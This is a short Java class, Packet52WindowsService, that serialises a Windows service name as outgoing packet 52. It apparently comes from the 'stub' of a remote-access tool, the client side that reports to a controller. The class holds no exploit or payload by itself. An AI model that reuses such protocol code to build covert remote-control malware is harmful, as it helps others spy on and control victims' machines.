package com.redpois0n.stub.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;

public class Packet52WindowsService extends AbstractOutgoingPacket {

	private String name;
	
	public Packet52WindowsService(String name) {
		this.name = name;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(name);
	}

	@Override
	public byte getPacketId() {
		return 52;
	}

}
